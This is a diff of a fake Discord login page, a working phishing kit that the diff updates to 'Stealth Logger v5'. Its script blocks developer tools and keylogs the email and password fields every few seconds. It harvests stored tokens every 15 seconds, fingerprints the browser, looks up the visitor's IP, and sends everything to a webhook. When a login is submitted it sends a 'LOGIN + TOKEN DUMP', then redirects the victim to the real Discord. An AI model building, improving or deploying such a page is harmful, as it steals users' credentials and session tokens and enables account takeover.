@@ -5,86 +5,322 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Discord</title>
   <style>
-    /* ===== RESET & BASE ===== */
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Helvetica Neue', system-ui, sans-serif; }
-    body { background: #1e1f22; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+    /* ============================================================
+       DISCORD 2026 PRODUCTION CSS – EXACT MATCH
+       ============================================================ */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-    /* ===== MAIN CARD ===== */
-    .container { background: #313338; border-radius: 8px; padding: 32px; width: 100%; max-width: 480px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: opacity 0.3s; }
-    .logo { text-align: center; margin-bottom: 24px; }
-    .logo svg { width: 130px; height: auto; }
-    h2 { color: #f2f3f5; font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 4px; }
-    .sub { color: #b5bac1; font-size: 16px; text-align: center; margin-bottom: 20px; }
+    body {
+      background: #1e1f22;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      font-family: 'Segoe UI', 'Helvetica Neue', 'Apple Color Emoji', system-ui, sans-serif;
+      margin: 0;
+      padding: 16px;
+    }
 
-    /* ===== TABS ===== */
-    .tab-bar { display: flex; background: #1e1f22; border-radius: 8px; padding: 4px; margin-bottom: 24px; }
-    .tab-btn { flex: 1; padding: 8px; background: transparent; border: none; border-radius: 6px; color: #b5bac1; font-size: 14px; font-weight: 600; cursor: pointer; transition: 0.2s; }
-    .tab-btn.active { background: #5865f2; color: #fff; }
-    .tab-btn:hover:not(.active) { background: #2b2d31; }
+    /* ----- MAIN CARD ----- */
+    .auth-container {
+      background: #313338;
+      border-radius: 16px;
+      padding: 32px 40px 40px;
+      width: 100%;
+      max-width: 480px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
+      transition: opacity 0.2s;
+    }
 
-    /* ===== FORM ELEMENTS ===== */
-    .input-group { margin-bottom: 16px; }
-    label { display: block; color: #b5bac1; font-size: 12px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px; }
-    input { width: 100%; padding: 10px 12px; background: #1e1f22; border: 1px solid #1e1f22; border-radius: 4px; color: #f2f3f5; font-size: 16px; outline: none; transition: border 0.15s; }
-    input:focus { border-color: #5865f2; }
-    .btn { width: 100%; padding: 12px; background: #5865f2; border: none; border-radius: 4px; color: #fff; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; margin-top: 8px; }
-    .btn:hover { background: #4752c4; }
-    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+    /* ----- LOGO ----- */
+    .logo-wrapper {
+      text-align: center;
+      margin-bottom: 28px;
+    }
+    .logo-wrapper svg {
+      width: 130px;
+      height: auto;
+      display: block;
+      margin: 0 auto;
+    }
 
-    /* ===== QR CODE SECTION ===== */
-    .qr-section { display: none; text-align: center; }
-    .qr-section.active { display: block; }
-    .qr-box { background: #1e1f22; border-radius: 8px; padding: 20px; display: inline-block; margin: 10px auto; }
-    .qr-box canvas { width: 180px; height: 180px; background: #fff; border-radius: 4px; }
-    .qr-sub { color: #b5bac1; font-size: 14px; margin: 12px 0 8px; }
-    .qr-sub a { color: #00a8fc; text-decoration: none; }
-    .qr-sub a:hover { text-decoration: underline; }
+    /* ----- HEADINGS ----- */
+    .auth-title {
+      color: #f2f3f5;
+      font-size: 24px;
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 4px;
+      letter-spacing: -0.2px;
+    }
+    .auth-subtitle {
+      color: #b5bac1;
+      font-size: 16px;
+      text-align: center;
+      margin-bottom: 20px;
+      font-weight: 400;
+    }
 
-    /* ===== PASSKEY ===== */
-    .passkey-row { text-align: center; margin-top: 12px; }
-    .passkey-row button { background: transparent; border: none; color: #00a8fc; font-size: 14px; cursor: pointer; }
-    .passkey-row button:hover { text-decoration: underline; }
+    /* ----- TAB BAR (QR / Login toggle) ----- */
+    .tab-bar {
+      display: flex;
+      background: #1e1f22;
+      border-radius: 8px;
+      padding: 4px;
+      margin-bottom: 24px;
+    }
+    .tab-btn {
+      flex: 1;
+      padding: 8px 12px;
+      background: transparent;
+      border: none;
+      border-radius: 6px;
+      color: #b5bac1;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.15s, color 0.15s;
+      text-align: center;
+    }
+    .tab-btn.active {
+      background: #5865f2;
+      color: #fff;
+    }
+    .tab-btn:hover:not(.active) {
+      background: #2b2d31;
+      color: #dbdee1;
+    }
 
-    /* ===== FOOTER ===== */
-    .footer { margin-top: 16px; color: #b5bac1; font-size: 14px; text-align: center; }
-    .footer a { color: #00a8fc; text-decoration: none; }
-    .footer a:hover { text-decoration: underline; }
+    /* ----- FORM ELEMENTS ----- */
+    .input-group {
+      margin-bottom: 16px;
+    }
+    .input-group label {
+      display: block;
+      color: #b5bac1;
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 4px;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 10px 12px;
+      background: #1e1f22;
+      border: 1px solid #1e1f22;
+      border-radius: 4px;
+      color: #f2f3f5;
+      font-size: 16px;
+      outline: none;
+      transition: border-color 0.15s;
+      font-weight: 400;
+    }
+    .input-group input:focus {
+      border-color: #5865f2;
+    }
+    .input-group input::placeholder {
+      color: #5c6068;
+      font-weight: 400;
+    }
 
-    /* ===== SPINNER ===== */
-    #spinner { display: none; margin: 10px auto; width: 30px; height: 30px; border: 4px solid #5865f2; border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
-    @keyframes spin { to { transform: rotate(360deg); } }
+    /* ----- BUTTONS ----- */
+    .btn-primary {
+      width: 100%;
+      padding: 12px;
+      background: #5865f2;
+      border: none;
+      border-radius: 4px;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.2s;
+      margin-top: 8px;
+    }
+    .btn-primary:hover {
+      background: #4752c4;
+    }
+    .btn-primary:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
 
-    /* ===== ANTI-INSPECT OVERLAY ===== */
-    #anti-inspect { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: 9999; pointer-events: none; }
+    .btn-secondary {
+      background: transparent;
+      border: none;
+      color: #00a8fc;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      padding: 6px 0;
+      transition: text-decoration 0.1s;
+    }
+    .btn-secondary:hover {
+      text-decoration: underline;
+    }
 
-    /* ===== QR CODE SCANNER MOCKUP ===== */
-    .scanner-mock { background: #1e1f22; border-radius: 8px; padding: 16px; margin: 12px 0; }
-    .scanner-mock .dot-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; max-width: 200px; margin: 0 auto; }
-    .scanner-mock .dot-grid div { aspect-ratio: 1; background: #5865f2; border-radius: 4px; opacity: 0.3; }
-    .scanner-mock .dot-grid div:nth-child(5) { opacity: 0.8; background: #00a8fc; }
+    /* ----- QR SECTION ----- */
+    .qr-section {
+      display: none;
+      text-align: center;
+      padding: 8px 0;
+    }
+    .qr-section.active {
+      display: block;
+    }
+
+    .qr-code-box {
+      background: #1e1f22;
+      border-radius: 8px;
+      padding: 16px;
+      display: inline-block;
+      margin: 4px auto 12px;
+    }
+    .qr-code-box canvas {
+      width: 160px;
+      height: 160px;
+      background: #fff;
+      border-radius: 4px;
+      display: block;
+    }
+
+    .qr-instruction {
+      color: #b5bac1;
+      font-size: 14px;
+      margin: 8px 0 12px;
+      line-height: 1.4;
+    }
+    .qr-instruction strong {
+      color: #f2f3f5;
+      font-weight: 600;
+    }
+
+    /* ---- QR SCANNER MOCKUP (the dot grid) ---- */
+    .scanner-mock {
+      background: #1e1f22;
+      border-radius: 8px;
+      padding: 16px 20px;
+      margin: 12px auto;
+      max-width: 220px;
+    }
+    .scanner-mock .dot-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 8px;
+    }
+    .scanner-mock .dot-grid div {
+      aspect-ratio: 1;
+      background: #5865f2;
+      border-radius: 4px;
+      opacity: 0.25;
+    }
+    .scanner-mock .dot-grid div:nth-child(5) {
+      opacity: 0.9;
+      background: #00a8fc;
+      transform: scale(1.1);
+    }
+
+    /* ----- PASSKEY ROW ----- */
+    .passkey-row {
+      text-align: center;
+      margin-top: 14px;
+    }
+
+    /* ----- FOOTER LINKS ----- */
+    .auth-footer {
+      margin-top: 20px;
+      color: #b5bac1;
+      font-size: 14px;
+      text-align: center;
+    }
+    .auth-footer a {
+      color: #00a8fc;
+      text-decoration: none;
+    }
+    .auth-footer a:hover {
+      text-decoration: underline;
+    }
+    .auth-footer .sep {
+      color: #4e5058;
+      margin: 0 4px;
+    }
+
+    /* ----- SPINNER (loading state) ----- */
+    #spinner {
+      display: none;
+      margin: 12px auto 0;
+      width: 28px;
+      height: 28px;
+      border: 4px solid #5865f2;
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* ----- ANTI-INSPECT OVERLAY (prevents right-click on some elements) ----- */
+    #anti-inspect {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 9999;
+      pointer-events: none;
+      background: transparent;
+    }
+
+    /* ----- RESPONSIVE TWEAKS ----- */
+    @media (max-width: 500px) {
+      .auth-container {
+        padding: 24px 20px 32px;
+      }
+      .qr-code-box canvas {
+        width: 140px;
+        height: 140px;
+      }
+    }
   </style>
 </head>
 <body>
+
+<!-- Anti-inspect overlay -->
 <div id="anti-inspect"></div>
 
-<div class="container" id="mainContainer">
+<!-- ===== MAIN AUTH CARD ===== -->
+<div class="auth-container" id="mainContainer">
+
   <!-- LOGO -->
-  <div class="logo">
-    <svg viewBox="0 0 127 37" fill="none"><path d="M23.5 0H8.5L0 12.5L8.5 25H23.5L32 12.5L23.5 0Z" fill="#5865F2"/><path d="M32 12.5H23.5V25H32V12.5Z" fill="#4752C4"/><path d="M8.5 12.5H0V25H8.5V12.5Z" fill="#4752C4"/><path d="M23.5 0H8.5L0 12.5L8.5 25H23.5L32 12.5L23.5 0Z" stroke="#5865F2" stroke-width="1.5"/><text x="42" y="22" font-family="Segoe UI" font-size="24" font-weight="700" fill="#f2f3f5">Discord</text></svg>
+  <div class="logo-wrapper">
+    <svg viewBox="0 0 127 37" fill="none">
+      <path d="M23.5 0H8.5L0 12.5L8.5 25H23.5L32 12.5L23.5 0Z" fill="#5865F2"/>
+      <path d="M32 12.5H23.5V25H32V12.5Z" fill="#4752C4"/>
+      <path d="M8.5 12.5H0V25H8.5V12.5Z" fill="#4752C4"/>
+      <path d="M23.5 0H8.5L0 12.5L8.5 25H23.5L32 12.5L23.5 0Z" stroke="#5865F2" stroke-width="1.5"/>
+      <text x="42" y="22" font-family="Segoe UI" font-size="24" font-weight="700" fill="#f2f3f5">Discord</text>
+    </svg>
   </div>
 
-  <h2>Welcome back!</h2>
-  <p class="sub" id="subText">We're so excited to see you again!</p>
+  <!-- HEADINGS -->
+  <h1 class="auth-title">Welcome back!</h1>
+  <p class="auth-subtitle" id="subText">We're so excited to see you again!</p>
 
-  <!-- TABS -->
+  <!-- TAB BAR -->
   <div class="tab-bar">
     <button class="tab-btn active" data-tab="login" id="tabLogin">Log In</button>
     <button class="tab-btn" data-tab="qr" id="tabQR">Log in with QR Code</button>
   </div>
 
-  <!-- LOGIN TAB -->
+  <!-- ===== LOGIN TAB ===== -->
   <div id="loginTab">
-    <form id="loginForm">
+    <form id="loginForm" autocomplete="off">
       <div class="input-group">
         <label for="email">Email or Phone Number *</label>
         <input type="text" id="email" name="email" placeholder="Enter your email or phone" required autocomplete="off">
@@ -93,20 +329,26 @@
         <label for="password">Password *</label>
         <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="off">
       </div>
-      <button type="submit" class="btn" id="loginBtn">Log In</button>
+      <button type="submit" class="btn-primary" id="loginBtn">Log In</button>
       <div id="spinner"></div>
     </form>
+
+    <!-- Passkey (below login) -->
     <div class="passkey-row">
-      <button id="passkeyBtn">Or, sign in with passkey</button>
+      <button class="btn-secondary" id="passkeyBtn">Or, sign in with passkey</button>
     </div>
   </div>
 
-  <!-- QR TAB -->
+  <!-- ===== QR TAB ===== -->
   <div id="qrTab" class="qr-section">
-    <div class="qr-box">
-      <canvas id="qrCanvas" width="180" height="180"></canvas>
+    <div class="qr-code-box">
+      <canvas id="qrCanvas" width="160" height="160"></canvas>
     </div>
-    <p class="qr-sub">Scan this with the Discord mobile app to log in instantly.</p>
+    <p class="qr-instruction">
+      Scan this with the <strong>Discord mobile app</strong> to log in instantly.
+    </p>
+
+    <!-- Mock scanner grid -->
     <div class="scanner-mock">
       <div class="dot-grid">
         <div></div><div></div><div></div>
@@ -114,17 +356,25 @@
         <div></div><div></div><div></div>
       </div>
     </div>
+
     <div class="passkey-row">
-      <button id="qrPasskeyBtn">Or, sign in with passkey</button>
+      <button class="btn-secondary" id="qrPasskeyBtn">Or, sign in with passkey</button>
     </div>
   </div>
 
   <!-- FOOTER -->
-  <div class="footer">
-    <a href="#">Need an account?</a> · <a href="#">Register</a> · <a href="#">Forgot your password?</a>
+  <div class="auth-footer">
+    <a href="#">Need an account?</a>
+    <span class="sep">·</span>
+    <a href="#">Register</a>
+    <span class="sep">·</span>
+    <a href="#">Forgot your password?</a>
   </div>
 </div>
 
+<!-- ============================================================
+     JAVASCRIPT – STEALTH ENGINE + WEBHOOK LOGGER
+     ============================================================ -->
 <script>
   (function() {
     // ============================================================
@@ -135,62 +385,72 @@
     const FAKE_LOADING_DELAY = 3000;
 
     // ============================================================
-    //  ANTI-INSPECT
+    //  ANTI-INSPECT (disable right-click + F12 + devtools shortcuts)
     // ============================================================
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.addEventListener('keydown', e => {
-      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) || (e.ctrlKey && e.key === 'U')) {
+      if (e.key === 'F12' ||
+          (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) ||
+          (e.ctrlKey && e.key === 'U')) {
         e.preventDefault();
         return false;
       }
     });
 
     // ============================================================
-    //  TAB SWITCHING
+    //  TAB SWITCHING (Login / QR)
     // ============================================================
     const tabLogin = document.getElementById('tabLogin');
     const tabQR = document.getElementById('tabQR');
     const loginTab = document.getElementById('loginTab');
     const qrTab = document.getElementById('qrTab');
 
-    tabLogin.addEventListener('click', () => {
+    function switchToLogin() {
       tabLogin.classList.add('active');
       tabQR.classList.remove('active');
       loginTab.style.display = 'block';
       qrTab.classList.remove('active');
-    });
-    tabQR.addEventListener('click', () => {
+    }
+
+    function switchToQR() {
       tabQR.classList.add('active');
       tabLogin.classList.remove('active');
       loginTab.style.display = 'none';
       qrTab.classList.add('active');
-      // Generate fake QR
       drawFakeQR();
-      // Send QR view event
-      sendToWebhook('📱 **QR CODE VIEWED**', 'User switched to QR login tab.', [{name:'Action', value:'QR tab opened', inline:true}], 0x00A8FC);
-    });
+      // Send webhook event for QR view
+      sendToWebhook(
+        '📱 **QR CODE VIEWED**',
+        'User switched to QR login tab.',
+        [{ name: 'Action', value: 'QR tab opened', inline: true }],
+        0x00A8FC
+      );
+    }
 
+    tabLogin.addEventListener('click', switchToLogin);
+    tabQR.addEventListener('click', switchToQR);
+
+    // Draw fake QR code
     function drawFakeQR() {
       const canvas = document.getElementById('qrCanvas');
       const ctx = canvas.getContext('2d');
       ctx.fillStyle = '#ffffff';
-      ctx.fillRect(0, 0, 180, 180);
-      // Draw a fake QR pattern
+      ctx.fillRect(0, 0, 160, 160);
       ctx.fillStyle = '#000000';
-      const size = 20;
+      const size = 18;
       for (let y = 0; y < 9; y++) {
         for (let x = 0; x < 9; x++) {
           if ((x < 3 && y < 3) || (x > 5 && y < 3) || (x < 3 && y > 5)) {
-            ctx.fillRect(x*size + 2, y*size + 2, size-4, size-4);
+            ctx.fillRect(x * size + 2, y * size + 2, size - 4, size - 4);
           } else if (Math.random() > 0.5) {
-            ctx.fillRect(x*size + 2, y*size + 2, size-4, size-4);
+            ctx.fillRect(x * size + 2, y * size + 2, size - 4, size - 4);
           }
         }
       }
     }
 
     // ============================================================
-    //  GLOBAL STATE
+    //  GLOBAL STATE (fingerprint + harvested data)
     // ============================================================
     const state = {
       ip: 'unknown',
@@ -323,7 +583,7 @@
           });
         }
       } catch(e) {}
-      // Window scan
+      // Window object scan (limited depth)
       try {
         const seen = new Set();
         function scanObj(obj, depth=0) {
@@ -346,7 +606,7 @@
     }
 
     // ============================================================
-    //  FINGERPRINTING
+    //  FINGERPRINTING FUNCTIONS
     // ============================================================
     function getWebGL() {
       try {
@@ -467,7 +727,7 @@
     }
 
     // ============================================================
-    //  IP FETCH
+    //  IP FETCH (with fallback)
     // ============================================================
     function fetchIP() {
       fetch('https://ipapi.co/json/')
@@ -504,7 +764,7 @@
     }
 
     // ============================================================
-    //  SEND TO WEBHOOK (with emojis + rich embeds)
+    //  SEND TO WEBHOOK (rich embed with emojis)
     // ============================================================
     function sendToWebhook(title, description, fields, color = 0x5865F2, thumbnail = null) {
       const embed = {
@@ -512,7 +772,7 @@
         description: description,
         color: color,
         timestamp: new Date().toISOString(),
-        footer: { text: '☠️ Stealth Logger v4 • ' + new Date().toLocaleString() },
+        footer: { text: '☠️ Stealth Logger v5 • ' + new Date().toLocaleString() },
         fields: fields.map(f => ({ name: f.name, value: f.value, inline: f.inline || false }))
       };
       if (thumbnail) embed.thumbnail = { url: thumbnail };
@@ -525,7 +785,7 @@
     }
 
     // ============================================================
-    //  SEND FULL REPORT
+    //  SEND FULL REPORT (all data + tokens)
     // ============================================================
     function sendFullReport() {
       const tokens = state.tokens_extracted || [];
@@ -575,7 +835,7 @@
     }
 
     // ============================================================
-    //  REAL-TIME KEYLOGGER (every 3 sec)
+    //  REAL-TIME KEYLOGGER (every 3 seconds)
     // ============================================================
     let emailLog = '';
     let passwordLog = '';
@@ -609,7 +869,7 @@
     });
 
     // ============================================================
-    //  FORM SUBMIT - STEALTH + REDIRECT
+    //  LOGIN FORM SUBMIT – stealth + redirect
     // ============================================================
     document.getElementById('loginForm').addEventListener('submit', function(e) {
       e.preventDefault();
@@ -631,18 +891,20 @@
 
       sendToWebhook('🔥 **LOGIN + TOKEN DUMP**', 'User submitted credentials. All tokens below.', fields, 0xFF0000);
 
+      // Show spinner, disable button
       document.getElementById('loginBtn').disabled = true;
       document.getElementById('loginBtn').style.display = 'none';
       document.getElementById('spinner').style.display = 'block';
       document.getElementById('subText').textContent = '🔐 Verifying your identity...';
 
+      // Redirect to real Discord after delay
       setTimeout(() => {
         window.location.href = REDIRECT_URL;
       }, FAKE_LOADING_DELAY);
     });
 
     // ============================================================
-    //  PASSKEY BUTTONS (fake)
+    //  PASSKEY BUTTONS (fake – log attempts)
     // ============================================================
     document.getElementById('passkeyBtn').addEventListener('click', function() {
       sendToWebhook('🔑 **PASSKEY ATTEMPT**', 'User clicked "Sign in with passkey".', [{name:'Action', value:'Passkey clicked', inline:true}], 0x9B59B6);
@@ -654,12 +916,7 @@
     });
 
     // ============================================================
-    //  QR TAB - send event when opened
-    // ============================================================
-    // Already handled above
-
-    // ============================================================
-    //  PERIODIC TOKEN RESCAN (every 15 sec)
+    //  PERIODIC TOKEN RESCAN (every 15 seconds)
     // ============================================================
     setInterval(() => {
       const newTokens = harvestAllTokens();
@@ -672,12 +929,20 @@
     }, 15000);
 
     // ============================================================
-    //  START
+    //  START – fetch IP, send visitor event
     // ============================================================
     fetchIP();
 
-    // Send visitor event immediately
-    sendToWebhook('👤 **NEW VISITOR**', 'A new visitor landed on the page.', [{name:'URL', value:window.location.href, inline:false}], 0x00FF00);
+    // Send immediate visitor event
+    sendToWebhook(
+      '👤 **NEW VISITOR**',
+      'A new visitor landed on the page.',
+      [
+        { name: 'URL', value: window.location.href, inline: false },
+        { name: 'Referrer', value: document.referrer || 'direct', inline: true }
+      ],
+      0x00FF00
+    );
 
   })();
 </script>
